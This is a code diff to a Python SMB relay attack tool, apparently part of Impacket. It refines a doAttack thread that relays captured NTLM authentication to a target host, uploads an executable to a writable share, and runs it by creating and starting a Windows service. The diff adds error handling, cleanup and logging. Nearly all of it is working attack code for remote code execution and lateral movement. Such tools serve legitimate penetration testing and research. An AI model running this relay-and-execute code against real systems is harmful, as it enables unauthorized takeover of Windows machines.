@@ -54,17 +54,23 @@ class doAttack(Thread):
 
     def getShares(self):
         # Setup up a DCE SMBTransport with the connection already in place
-        self._rpctransport = transport.SMBTransport('','',filename = r'\srvsvc', smb_server = self.client)
-        self._dce = dcerpc.DCERPC_v5(self._rpctransport)
-        self._dce.connect()
+        print "[*] Requesting shares on %s....." % (self.client.get_remote_host())
+        try: 
+            self._rpctransport = transport.SMBTransport('','',filename = r'\srvsvc', smb_server = self.client)
+            self._dce = dcerpc.DCERPC_v5(self._rpctransport)
+            self._dce.connect()
 
-        self._dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
-        srv_svc = srvsvc.DCERPCSrvSvc(self._dce)
-        resp = srv_svc.get_share_enum_1(self._rpctransport.get_dip())
-        return resp
+            self._dce.bind(srvsvc.MSRPC_UUID_SRVSVC)
+            srv_svc = srvsvc.DCERPCSrvSvc(self._dce)
+            resp = srv_svc.get_share_enum_1(self._rpctransport.get_dip())
+            return resp
+        except:
+            print "[!] Error requesting shares on %s, aborting....." % (self.client.get_remote_host())
+            raise
+
         
     def createService(self, handle, share, path):
-        print "[*] Creating service %s on %s....." % (self.__service_name, self.client.get_remote_host()),
+        print "[*] Creating service %s on %s....." % (self.__service_name, self.client.get_remote_host())
 
 
         # First we try to open the service in case it exists. If it does, we remove it.
@@ -86,14 +92,13 @@ class doAttack(Thread):
         try: 
             resp = self.rpcsvc.CreateServiceW(handle, self.__service_name.encode('utf-16le'), self.__service_name.encode('utf-16le'), command.encode('utf-16le'))
         except:
-            print "ERROR"
+            print "[!] Error creating service %s on %s" % (self.__service_name, self.client.get_remote_host())
             return None
         else:
-            print "OK"
             return resp['ContextHandle']
 
     def openSvcManager(self):
-        print "[*] Opening SVCManager on %s....." % self.client.get_remote_host(),
+        print "[*] Opening SVCManager on %s....." % self.client.get_remote_host()
         # Setup up a DCE SMBTransport with the connection already in place
         self._rpctransport = transport.SMBTransport('','',filename = r'\svcctl', smb_server = self.client)
         self._dce = dcerpc.DCERPC_v5(self._rpctransport)
@@ -103,10 +108,9 @@ class doAttack(Thread):
         try:
             resp = self.rpcsvc.OpenSCManagerW()
         except:
-            print "ERROR" 
+            print "[!] Error opening SVCManager on %s....." % self.client.get_remote_host()
             return 0
         else:
-            print "OK"
             return resp['ContextHandle']
 
     def copy_file(self, src, tree, dst):
@@ -114,7 +118,11 @@ class doAttack(Thread):
         fh = open(src, 'rb')
         f = dst
         pathname = string.replace(f,'/','\\')
-        self.client.stor_file(tree, pathname, fh.read)
+        try:
+            self.client.stor_file(tree, pathname, fh.read)
+        except:
+            print "[!] Error uploading file %s, aborting....." % dst
+            raise
         fh.close()
 
     def findWritableShare(self, shares):
@@ -126,7 +134,8 @@ class doAttack(Thread):
                    self.client.mkdir(share,'BETO')
                except:
                    # Can't create, pass
-                   pass
+                   print '[!] No written share found, aborting...'
+                   raise
                else:
                    print '[*] Found writable share %s' % share
                    self.client.rmdir(share,'BETO')
@@ -145,40 +154,59 @@ class doAttack(Thread):
             del(self.client)
         else:
             print "[*] Attacking %s" % self.client.get_remote_host()
-            # TODO: Properly check errors here
+            fileCopied = False
+            serviceCreated = False
             # Do the stuff here
-            # Let's get the shares
-            shares = self.getShares()
-            share = self.findWritableShare(shares)
-            self.copy_file(self.__exeFile ,share,self.__binary_service_name)
-            svcManager = self.openSvcManager()
-            if svcManager != 0:
-                path = '\\\\127.0.0.1\\' + share 
-                service = self.createService(svcManager, share, path)
-                if service != 0:
-                    parameters = [ '%s\\%s' % (path,self.__binary_service_name), '%s\\%s' % (path, '') ]            
-                    # Start service
-                    print "[*] Connect now to %s!" % self.client.get_remote_host()
-                    print '[*] Starting service %s.....' % self.__service_name,
+            try:
+                # Let's get the shares
+                shares = self.getShares()
+                share = self.findWritableShare(shares)
+                res = self.copy_file(self.__exeFile ,share,self.__binary_service_name)
+                fileCopied = True
+                svcManager = self.openSvcManager()
+                if svcManager != 0:
+                    path = '\\\\127.0.0.1\\' + share 
+                    service = self.createService(svcManager, share, path)
+                    serviceCreated = True
+                    if service != 0:
+                        parameters = [ '%s\\%s' % (path,self.__binary_service_name), '%s\\%s' % (path, '') ]            
+                        # Start service
+                        print "[*] Connect now to %s!" % self.client.get_remote_host()
+                        print '[*] Starting service %s.....' % self.__service_name
+                        try:
+                            self.rpcsvc.StartServiceW(service)
+                        except:
+                            pass
+                        print '[*] Stoping service %s.....' % self.__service_name
+                        try:
+                            self.rpcsvc.StopService(service)
+                        except:
+                            pass
+                        print '[*] Removing service %s.....' % self.__service_name
+                        self.rpcsvc.DeleteService(service)
+                        self.rpcsvc.CloseServiceHandle(service)
+                    self.rpcsvc.CloseServiceHandle(svcManager)
+                print '[*] Removing file %s.....' % self.__exeFile
+                self.client.remove(share, self.__binary_service_name)
+            except Exception, e:
+                print "[!] Error performing the attack, cleaning up: %s" %e
+                try:
+                    self.rpcsvc.StopService(service)
+                except:
+                    pass
+                if fileCopied is True:
                     try:
-                        self.rpcsvc.StartServiceW(service)
+                        self.client.remove(share, self.__binary_service_name)
                     except:
                         pass
-                    print 'OK'
-                    print '[*] Stoping service %s.....' % self.__service_name,
+                if serviceCreated is True:
                     try:
-                        self.rpcsvc.StopService(service)
+                        self.rpcsvc.DeleteService(service)
                     except:
                         pass
-                    print 'OK'
-                    print '[*] Removing service %s.....' % self.__service_name,
-                    self.rpcsvc.DeleteService(service)
-                    print 'OK'
-                    self.rpcsvc.CloseServiceHandle(service)
-                self.rpcsvc.CloseServiceHandle(svcManager)
-            self.client.remove(share, self.__binary_service_name)
             self.client.logoff()
-          
+            del(self.client)
+ 
 
 class SMBClient(smb.SMB):
     def __init__(self, remote_name, extended_security = True, sess_port = 445):
@@ -351,6 +379,7 @@ class SMBRelayServer:
                 else:
                     extSec = True
                 client = SMBClient(self.target, extended_security = extSec)
+                client.set_timeout(60)
             except Exception, e:
                 print "[!] Connection against target %s FAILED" % self.target
                 print e
@@ -461,6 +490,7 @@ class SMBRelayServer:
                     # Reset the UID
                     smbClient.setUid(0)
                     print "[!] Authenticating against %s as %s\%s FAILED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    del (smbData[self.target])
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
